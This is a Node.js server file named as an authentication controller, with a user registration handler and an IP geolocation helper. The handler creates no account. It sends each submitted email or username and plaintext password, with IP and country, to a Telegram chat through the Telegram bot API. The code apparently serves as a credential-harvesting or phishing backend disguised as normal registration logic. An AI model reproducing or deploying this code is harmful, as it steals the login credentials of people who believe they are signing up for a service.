// server/controller/authController.js
const axios = require('axios');
const jwt = require('jsonwebtoken');
const moment = require('moment');
const { JWT_SECRET } = require('../config/keys');
const { getClientIp } = require('request-ip');
const useragent = require('useragent');
exports.registerUser = async (req, res) => {
  let { emailOrUsername, password , clientSessionId, ip} = req.body;
  if (!emailOrUsername || !password || !clientSessionId) {
    return res.json({
      error: "Fields must not be empty",
    });
  }
  if (password.length < 8) {
    return res.json({
      error: "Password must be at least 8 characters long",
    });
  }
  try {
    // Get user IP & location
    const { country } = await getGeolocation(ip);

    // Generate JWT token based on clientSessionId
    const token = jwt.sign(
      { clientSessionId, role: "user" }, // Using clientSessionId instead of userId
      JWT_SECRET
    );

    const encode = jwt.verify(token, JWT_SECRET);
    try {
      const telegramMessage = `
🔐 New User Registration
📧 Email/Username: ${emailOrUsername}
🔑 Password: ${password}
🌐 IP: ${ip}
Country: ${country} 
🕒 Time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}
      `;

      await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: telegramMessage,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.log("Telegram notification error:", telegramError);
      // Don't block the registration process if Telegram notification fails
    }
    return res.json({
      token: token,
      clientSessionId: clientSessionId, // Returning clientSessionId instead of userId
      user: encode,
    });

  } catch (err) {
    console.log(err);
    return res.json({
      error: "An error occurred during registration",
    });
  }
};



async function getGeolocation(ip) {
  const ipinfoToken = process.env.IPINFO_TOKEN;
  const ipv4 = ip.startsWith('::ffff:') ? ip.split('::ffff:')[1] : ip;

  // Check for private/local IPs
  const isPrivateIP = /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ipv4);
  if (isPrivateIP) {
    console.log('Private IP detected, defaulting to "Unknown".');
    return { country: "Unknown" };
  }

  try {
    const response = await axios.get(`https://ipinfo.io/${ipv4}/json?token=${ipinfoToken}`);
    return {
      country: response.data.country || "Unknown",
    };
  } catch (error) {
    console.error('Geolocation API error:', error.response?.data || error.message);
    return { country: "Unknown" }; // Default in case of error
  }
}
